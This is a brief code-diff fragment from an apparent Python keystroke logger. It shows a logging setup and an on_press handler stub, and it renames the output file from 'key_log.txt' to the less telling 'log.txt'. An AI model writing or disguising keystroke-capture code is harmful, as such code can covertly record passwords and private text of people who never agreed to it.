@@ -6,7 +6,7 @@ import logging
 log_dir = ""
 
 #FORMATTING
-logging.basicConfig(filename=(log_dir + 'key_log.txt'), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
+logging.basicConfig(filename=(log_dir + 'log.txt'), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
 
 #LOGGING THE WHAT THE LISTENER HEARD
 def on_press(key):
